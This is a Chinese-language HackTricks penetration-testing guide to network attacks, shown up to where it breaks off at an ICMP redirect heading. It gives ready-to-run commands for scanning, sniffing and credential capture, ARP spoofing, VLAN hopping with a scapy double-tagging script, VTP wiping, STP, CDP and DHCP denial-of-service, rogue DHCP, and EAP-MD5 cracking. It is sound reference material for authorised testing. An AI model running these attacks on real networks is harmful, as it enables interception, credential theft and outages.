# 网络渗透测试

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为英雄</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在 **HackTricks上看到您的公司广告** 或 **下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现 [**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**漏洞赏金小贴士**：**注册** **Intigriti**，一个由黑客创建的高级**漏洞赏金平台**！立即加入我们 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达 **$100,000** 的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 从外部发现主机

这将是一个**简短的部分**，关于如何找到从**互联网**响应的**IP地址**。\
在这种情况下，您有一些**IP范围**（甚至可能是几个**范围**），您只需要找出**哪些IP地址在响应**。

### ICMP

这是发现主机是否在线的**最简单**和**最快**的方法。\
您可以尝试发送一些**ICMP**数据包并**期待响应**。最简单的方法就是发送一个**回显请求**并等待响应。您可以使用简单的`ping`或使用`fping`来处理**范围**。\
您还可以使用**nmap**发送其他类型的ICMP数据包（这将避免对常见的ICMP回显请求-响应的过滤）。
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP端口发现

通常会发现各种ICMP数据包被过滤。那么，检查主机是否在线的唯一方法就是**尝试找到开放端口**。每个主机有**65535个端口**，所以，如果你有一个“大”的范围，你**不能**测试每个主机的**每个端口**是否开放，那会花费太多时间。\
因此，你需要的是一个**快速端口扫描器**（[masscan](https://github.com/robertdavidgraham/masscan)）和一个**最常用端口**的列表：
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
```markdown
你也可以使用`nmap`执行此步骤，但它较慢，且`nmap`在识别主机是否在线时有时会遇到问题。

### HTTP端口发现

这只是一个TCP端口发现，当你想要**专注于发现HTTP** **服务**时很有用：
```
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP 端口发现

您也可以尝试检查一些**UDP端口是否开放**，以决定是否应该**更加关注**某个**主机**。由于UDP服务通常不会对常规空的UDP探测包**响应任何数据**，因此很难判断端口是被过滤还是开放的。决定这一点的最简单方法是发送一个与正在运行的服务相关的数据包，由于您不知道正在运行哪种服务，您应该尝试基于端口号的最可能的服务：
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
以下是之前提出的nmap命令行，它将测试**/24**范围内每个主机的**前1000个UDP端口**，即使只是这样也将花费**>20分钟**。如果需要**更快的结果**，您可以使用[**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)：`./udp-proto-scanner.pl 199.66.11.53/24` 这将向它们的**预期端口**发送这些**UDP探针**（对于/24范围，这只需1分钟）：_DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP端口发现
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Wifi渗透测试

在这里，您可以找到截至撰写时所有已知Wifi攻击的精彩指南：

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## 从内部发现主机

如果您在网络内部，您首先想要做的事情之一就是**发现其他主机**。根据您可以/想要制造的**噪音量**，可以执行不同的操作：

### 被动

您可以使用这些工具在连接的网络内被动发现主机：
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### 主动

请注意，在[_**从外部发现主机**_](./#discovering-hosts-from-the-outside)（_TCP/HTTP/UDP/SCTP 端口发现_）中评论的技术也可以在**这里应用**。\
但是，由于您与其他主机处于**同一网络**中，您可以做**更多事情**：
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### 主动ICMP

请注意，在_[_**ICMP**_](./#icmp)中评论的技术也可以在这里**应用**。\
但是，由于您与其他主机在**同一网络**中，您可以做**更多事情**：

* 如果您**ping**一个**子网广播地址**，ping应该会到达**每个主机**，他们可能会**回应**您：`ping -b 10.10.5.255`
* Ping**网络广播地址**，您甚至可以找到位于**其他子网**内的主机：`ping -b 255.255.255.255`
* 使用`nmap`的`-PE`、`-PP`、`-PM`标志来执行主机发现，分别发送**ICMPv4回声**、**时间戳**和**子网掩码请求**：`nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **网络唤醒**

网络唤醒用于通过**网络消息**来**打开**计算机。用于打开计算机的魔术包只是一个提供了**MAC Dst**的数据包，然后在同一个数据包内**重复16次**。\
然后这种数据包通常在**以太网0x0842**或**UDP数据包发送到端口9**中发送。\
如果没有提供**\[MAC]**，数据包将发送到**广播以太网**（并且广播MAC将是被重复的那个）。
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## 扫描主机

一旦您发现了所有想要深入扫描的IP（外部或内部），可以执行不同的操作。

### TCP

* **开放**端口：_SYN --> SYN/ACK --> RST_
* **关闭**端口：_SYN --> RST/ACK_
* **过滤**端口：_SYN --> \[无响应]_
* **过滤**端口：_SYN --> ICMP消息_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

扫描UDP端口有两种选择：

* 发送**UDP数据包**并检查响应 _**ICMP不可达**_，如果端口是**关闭**的（在多数情况下，ICMP会被**过滤**，所以如果端口关闭或打开，你将不会收到任何信息）。
* 发送**格式化的数据报**以引起**服务**的响应（例如，DNS、DHCP、TFTP等，如_nmap-payloads_中所列）。如果你收到了**响应**，那么，端口是**开放**的。

**Nmap**将使用"-sV"**混合使用两种**选项（UDP扫描非常慢），但请注意，UDP扫描比TCP扫描慢：
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP 扫描

SCTP 与 TCP 和 UDP 并列。旨在通过 **IP** 提供**电话**数据的**传输**，该协议复制了信令系统 7 (SS7) 的许多可靠性特性，并支撑着一个更大的协议家族，称为 SIGTRAN。SCTP 得到包括 IBM AIX、Oracle Solaris、HP-UX、Linux、Cisco IOS 和 VxWorks 在内的操作系统支持。

nmap 提供了两种不同的 SCTP 扫描：_-sY_ 和 _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS 和 IPS 绕过

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **更多 nmap 选项**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### 揭示内部 IP 地址

配置错误的路由器、防火墙和网络设备有时会**响应**网络探测，**使用非公共源地址**。您可以使用 _tcpdump_ 来**识别**在测试期间从**私有地址**收到的**数据包**。在这种情况下，Kali Linux 中的 _eth2_ 接口可以从**公共互联网**进行**寻址**（如果您位于**NAT**或**防火墙**的**后面**，这类数据包可能会被**过滤**）。
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## 嗅探

通过嗅探，你可以通过审查捕获的帧和数据包来了解IP范围、子网大小、MAC地址和主机名的详细信息。如果网络配置错误或交换结构承受压力，攻击者可以通过被动网络嗅探捕获敏感材料。

如果交换式以太网网络配置正确，你只会看到广播帧和发送到你的MAC地址的材料。

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
一个人也可以通过SSH会话实时使用Wireshark作为GUI从远程机器捕获数据包。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

显然。

### 捕获凭证

您可以使用像 [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) 这样的工具从 pcap 文件或实时接口解析凭证。

## 局域网攻击

### ARP欺骗

ARP欺骗包括发送无请求的ARP响应，以指示某台机器的IP具有我们设备的MAC地址。然后，受害者将更改ARP表，并且每次想要联系被欺骗的IP时，都会联系我们的机器。

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

通过发送许多具有不同源 MAC 地址的数据包，使交换机的 CAM 表溢出。当 CAM 表满了之后，交换机开始像集线器一样工作（广播所有流量）。
```bash
macof -i <interface>
```
在现代交换机中，这个漏洞已经被修复。

### 802.1Q VLAN / DTP 攻击

#### 动态汇聚

**DTP（动态汇聚协议）** 是一种链路层协议，旨在提供自动汇聚系统。使用 DTP，交换机决定哪个端口将以汇聚模式（Trunk）工作，哪个不会。使用 **DTP** 表明 **网络设计不佳。** **汇聚应该严格地** 在需要的地方使用，并且应该有文档记录。

**默认情况下，所有交换机端口都以动态自动模式运行。** 这表明交换机端口处于来自邻近交换机的汇聚发起模式。**渗透测试人员需要物理连接到交换机并发送 DTP Desirable 帧**，这会触发端口切换到汇聚模式。攻击者随后可以使用 STP 帧分析来枚举 VLAN，并通过创建虚拟接口绕过 VLAN 分段。

许多交换机默认支持动态汇聚协议（DTP），然而，敌手可以滥用它来**模拟交换机并接收跨所有 VLAN 的流量**。工具 [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) 可以嗅探接口并**报告交换机是否处于默认模式、汇聚、动态、自动或接入模式**（这是唯一可以避免 VLAN 跳跃的模式）。该工具将指示交换机是否易受攻击。

如果发现网络易受攻击，你可以使用 _**Yersinia**_ 发起 "**启用汇聚**" 使用协议 "**DTP**"，你将能够看到所有 VLAN 的网络数据包。
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

要枚举VLANs，也可以使用脚本 [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py) 生成DTP Desirable帧。**在任何情况下都不要中断脚本。**它每三秒注入一次DTP Desirable。**交换机上动态创建的干道通道仅存活五分钟。五分钟后，干道会断开。**
```
sudo python3 DTPHijacking.py --interface eth0
```
#### 攻击特定的VLAN

一旦你知道了VLAN ID和IP值，你可以**配置一个虚拟接口来攻击特定的VLAN**。\
如果没有DHCP，那么使用_ifconfig_来设置静态IP地址。
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### 自动VLAN跳跃

讨论的**动态中继和创建虚拟接口以及在**其他VLAN内发现主机的攻击被以下工具**自动执行**：[**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### 双重标记

如果攻击者知道**受害主机的MAC、IP和VLAN ID的值**，他可以尝试对帧进行**双重标记**，既标记其指定的VLAN也标记受害者的VLAN，然后发送数据包。由于**受害者无法回连**攻击者，因此攻击者**最好通过UDP与**可以执行一些有趣操作的协议通信（如SNMP）。

攻击者的另一个选择是发起**TCP端口扫描，伪装一个由攻击者控制且受害者可以访问的IP**（可能通过互联网）。然后，攻击者可以在他所拥有的第二台主机上嗅探，看是否收到了来自受害者的一些数据包。

![](<../../.gitbook/assets/image (635) (1).png>)

要执行此攻击，您可以使用scapy：`pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### 横向VLAN分段绕过 <a href="#d679" id="d679"></a>

如果你**可以访问你直接连接的交换机**，你就有能力在网络内**绕过VLAN分段**。只需**将端口切换到trunk模式**（也称为trunk），创建带有目标VLANs ID的虚拟接口，并配置IP地址。你可以尝试动态请求地址（DHCP），或者你可以静态配置它。这取决于具体情况。

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### 三层私有VLAN绕过

在客户无线网络和其他环境中，私有VLAN（也称为_端口隔离_）设置用于**防止对等互动**（即，客户端**连接到无线接入点但不能相互通信**）。根据网络ACLs（或缺乏ACLs），可能可以向路由器发送IP数据包，然后路由器将数据包转发回邻近的对等端。

这种攻击将发送一个**特制的数据包到客户端的IP，但使用路由器的MAC**。然后，**路由器将重定向数据包到客户端**。如同_双重标记攻击_，你可以通过控制受害者可以访问的主机来利用这个漏洞。

### VTP攻击

**VTP（VLAN Trunking Protocol）**是一个旨在集中管理VLANs的协议。为了跟踪当前的VLAN数据库，交换机检查特殊的修订号。当任何表更新发生时，修订号增加一。如果交换机检测到具有更高修订号的配置，它将自动更新其VLAN数据库。

#### VTP域中的角色 <a href="#ebfc" id="ebfc"></a>

* **VTP服务器。**在VTP服务器角色中的交换机可以创建新的VLANs，删除旧的，或者改变VLANs本身的信息。**它还为域中的其他成员生成VTP公告。**
* **VTP客户端。**在此角色中的交换机将从域中的其他交换机接收特定的VTP公告，以更新其自己的VLAN数据库。客户端在创建VLANs方面受到限制，甚至不允许本地更改VLAN配置。换句话说，**只读访问。**
* **VTP透明。**在此模式下，交换机不参与VTP过程，并且可以完全本地管理整个VLAN配置。在透明模式下运行时，交换机只传输其他交换机的VTP公告，而不影响它们的VLAN配置。**这样的交换机将始终具有修订号为零，且无法被攻击。**

#### 广告类型 <a href="#b384" id="b384"></a>

* **摘要广告 —** VTP服务器每**300秒（5分钟）**发送的VTP公告。此公告存储VTP域名、协议版本、时间戳和MD5配置哈希值。
* **子集广告 —** 每当VLAN配置更改发生时发送的VTP公告。
* **广告请求 —** 是VTP客户端向VTP服务器请求摘要广告消息的请求。通常在交换机检测到具有更高配置修订号的摘要广告消息时发送。

VTP**只能从trunk端口攻击**，因为**VTP公告只在trunk端口上广播和接收。** **因此，在攻击DTP后进行渗透测试时，你的下一个目标可能是VTP。**要攻击VTP域，你可以**使用Yersinia**来**运行VTP注入，将擦除整个VLAN** **数据库**，从而使网络瘫痪。

{% hint style="info" %}
VTP协议有多达**三个版本**。在这篇文章中，攻击的是第一个版本，VTPv1
{% endhint %}
```bash
yersinia -G #For graphic mode
```
要删除整个VLAN数据库，请选择**删除所有VTP VLAN**选项

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### STP攻击

**如果你无法在接口上捕获BPDU帧，那么你成功进行STP攻击的可能性不大。**

#### **STP BPDU DoS**

发送大量的BPDUs TCP（拓扑更改通知）或Conf（创建拓扑时发送的BPDUs），交换机会过载并停止正确工作。
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP 攻击**

当一个 TCP 被发送时，交换机的 CAM 表将在15秒内被删除。然后，如果你持续发送这种类型的数据包，CAM 表将不断重启（或每15秒一次），当它重启时，交换机的行为就像一个集线器。
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

攻击者模拟交换机的行为，成为网络的STP根节点。然后，更多数据将通过他传输。当你连接到两个不同的交换机时，这一点很有趣。\
这是通过发送BPDUs CONF数据包，声称**优先级**值小于实际根交换机的实际优先级来完成的。
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**如果攻击者连接到2个交换机，他可以成为新树的根，这两个交换机之间的所有流量都将通过他**（将执行MITM攻击）。
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP 攻击

CISCO Discovery Protocol 是 CISCO 设备用来相互通信的协议，**发现谁在线**以及它们具有什么功能。

#### 信息收集 <a href="#0e0f" id="0e0f"></a>

**默认情况下，CDP 会向所有端口发送公告。**但如果入侵者连接到同一交换机上的端口怎么办？使用网络嗅探器，无论是 **Wireshark,** **tcpdump** 还是 **Yersinia**，他都能提取**有关设备本身的宝贵信息**，从其型号到 Cisco IOS 版本。使用这些信息，他将能够枚举相同版本的 Cisco IOS 并找到漏洞，然后利用它。

#### CDP 泛洪攻击 <a href="#0d6a" id="0d6a"></a>

你可以通过模拟真实的 CISCO 设备来耗尽设备内存，对 CISCO 交换机进行 DoS 攻击。
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
选择**泛洪CDP表**选项并开始攻击。交换机CPU将会过载，CDP邻居表也是如此，**导致“网络瘫痪”。**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### CDP冒充攻击
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
您还可以使用 [**scapy**](https://github.com/secdev/scapy/)。确保安装时包含 `scapy/contrib` 包。

### VoIP 攻击

尽管VoIP（网络电话）设备原本是为员工使用设计的，但现代VoIP设备越来越多地与物联网设备集成。现在许多员工可以使用特定电话号码解锁门，控制房间的温控器...

工具 [**voiphopper**](http://voiphopper.sourceforge.net) 模仿Cisco、Avaya、Nortel和Alcatel-Lucent环境中VoIP电话的行为。它使用支持的设备发现协议之一，如Cisco发现协议（CDP）、动态主机配置协议（DHCP）、链路层发现协议媒体端点发现（LLDP-MED）和802.1Q ARP，自动发现语音网络的正确VLAN ID。

**VoIP Hopper** 支持 **三种** CDP模式。**嗅探**模式检查网络数据包并尝试定位VLAN ID。使用时，将 **`-c`** 参数设置为 `0`。**欺骗**模式生成类似于真实VoIP设备在企业网络中传输的自定义数据包。使用时，将 **`-c`** 参数设置为 **`1`**。带有 **预制数据包** 的欺骗模式发送与Cisco 7971G-GE IP电话相同的数据包。使用时，将 **`-c`** 参数设置为 **`2`**。

我们使用最后一种方法，因为它是最快的方法。**`-i`** 参数指定攻击者的 **网络** **接口**，**`-E`** 参数指定被模仿的 **VOIP设备名称**。我们选择了与Cisco VoIP电话命名格式兼容的名称SEP001EEEEEEEEE。该格式由“SEP”开头，后跟一个MAC地址。在企业环境中，您可以通过查看电话背面的MAC标签；按下电话的设置按钮并选择电话显示屏上的型号信息选项；或者将VoIP设备的以太网线连接到您的笔记本电脑，并使用Wireshark观察设备的CDP请求，来模仿现有的VoIP设备。
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
如果工具执行成功，**VLAN 网络将为攻击者的设备分配一个 IPv4 地址**。

### DHCP 攻击

#### 枚举
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**两种类型的DoS**可以对DHCP服务器执行。第一种是**模拟足够多的假主机以使用所有可能的IP地址**。\
这种攻击只有在你能看到DHCP服务器的响应并完成协议（**发现**（客户端）--> **提供**（服务器）--> **请求**（客户端）--> **确认**（服务器））时才会起作用。例如，在**Wifi网络中不可能**。

另一种执行DHCP DoS的方法是使用每个可能的IP作为源代码发送**DHCP-RELEASE数据包**。然后，服务器会认为每个人都已经完成了IP的使用。
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
以下是使用工具 [DHCPing](https://github.com/kamorin/DHCPig) 的更自动化的方法。

您可以使用上述 DoS 攻击强迫客户端在环境中获取新租约，并耗尽合法服务器，使其无响应。因此，当合法尝试重新连接时，**您可以提供下一次攻击中提到的恶意值**。

#### 设置恶意值

您可以使用 Responder DHCP 脚本 (_/usr/share/responder/DHCP.py_) 来建立一个恶意的 DHCP 服务器。设置恶意网关并不理想，因为劫持的连接只是半双工的（即，我们捕获来自客户端的出站数据包，但不捕获来自合法网关的响应）。因此，我建议设置一个恶意的 DNS 或 WPAD 服务器，以捕获 HTTP 流量和特别是凭据。

| 描述                                       | 示例                                                                        |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| 我们的 IP 地址，作为网关宣传               | _-i 10.0.0.100_                                                            |
| 本地 DNS 域名（可选）                      | _-d example.org_                                                           |
| 原始路由器/网关的 IP 地址                  | _-r 10.0.0.1_                                                              |
| 主 DNS 服务器 IP 地址                       | _-p 10.0.0.100_                                                            |
| 次 DNS 服务器 IP 地址（可选）              | _-s 10.0.0.1_                                                              |
| 本地网络的子网掩码                          | _-n 255.255.255.0_                                                         |
| 用于监听 DHCP 流量的接口                    | _-I eth1_                                                                  |
| WPAD 配置地址（URL）                        | _-w “_[http://10.0.0.100/wpad.dat\n”](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| 伪造默认网关 IP 地址                        | -S                                                                         |
| 响应所有 DHCP 请求（非常吵闹）              | -R                                                                         |

### **EAP 攻击**

以下是一些可以用来针对 802.1X 实现的攻击策略：

* 通过 EAP 进行主动的暴力破解密码
* 使用畸形 EAP 内容攻击 RADIUS 服务器 _\*\*_（利用）
* EAP 消息捕获和离线密码破解（EAP-MD5 和 PEAP）
* 强制 EAP-MD5 认证以绕过 TLS 证书验证
* 在使用集线器或类似设备认证后注入恶意网络流量

如果攻击者位于受害者和认证服务器之间，他可以尝试（如有必要）将认证协议降级为 EAP-MD5 并捕获认证尝试。然后，他可以使用以下方法进行暴力破解：
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) 攻击 <a href="#6196" id="6196"></a>

**FHRP**（First Hop Redundancy Protocol，首跳冗余协议）是一类设计用于**创建热备份路由系统**的网络协议。通过FHRP，物理路由器可以组合成一个单一的逻辑设备，这增加了容错能力并有助于分配负载。

**思科系统工程师开发了两种FHRP协议，GLBP和HSRP。**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

路由信息协议（RIP）有三个版本—RIP、RIPv2和RIPng。RIP和RIPv2使用UDP数据报通过端口520发送给对等体，而RIPng通过IPv6组播向UDP端口521广播数据报。RIPv2引入了MD5认证支持。RIPng没有内置认证机制；相反，它依赖于IPv6内的可选IPsec AH和ESP头。

有关如何攻击此协议的更多信息，请参阅书籍 _**网络安全评估：了解您的网络（第三版）**_。

### EIGRP 攻击

**EIGRP（增强型内部网关路由协议）**是一种动态路由协议。**它是一种距离矢量协议。**如果存在**无认证**和被动接口的配置，**入侵者**可以干扰EIGRP路由并导致**路由表中毒**。此外，EIGRP网络（换句话说，自治系统）**是扁平的，没有分割成任何区域**。如果**攻击者注入路由**，这条路由很可能会在整个自治的EIGRP系统中**传播**。

攻击EIGRP系统需要**与合法的EIGRP路由器建立邻接关系**，这为从基本侦察到各种注入提供了许多可能性。

\*\*\*\*[**FRRouting**](https://frrouting.org/) 允许你实现**一个支持BGP、OSPF、EIGRP、RIP等协议的虚拟路由器。**你需要做的就是在攻击者的系统上部署它，你就可以真正地假装成路由域中的合法路由器。

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) 也支持捕获EIGRP广播和注入数据包以操纵路由配置。有关如何使用Coly攻击它的更多信息，请查看 _**网络安全评估：了解您的网络（第三版）**_。

### OSPF

大多数开放最短路径优先（OSPF）实现使用MD5来在路由器之间提供认证。Loki和John the Ripper可以捕获并攻击MD5哈希以揭示密钥，然后可以使用该密钥来宣告新路由。路由参数通过使用_注入_标签设置，密钥在_连接_下设置。

有关如何攻击此协议的更多信息，请参阅书籍 _**网络安全评估：了解您的网络（第三版）**_。

### 其他通用工具和资源

* [**Above**](https://github.com/c4s73r/Above): 用于扫描网络流量和发现漏洞的工具
* 你可以在[这里](https://github.com/Sab0tag3d/MITM-cheatsheet)找到更多关于网络攻击的信息。_(TODO: 阅读全部内容并添加任何新的攻击（如果有的话）)_

## **欺骗**

攻击者通过发送假的DHCP响应来配置网络新成员的所有网络参数（GW、IP、DNS）。
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

查看[前一节](./#arp-spoofing)。

### ICMPRedirect

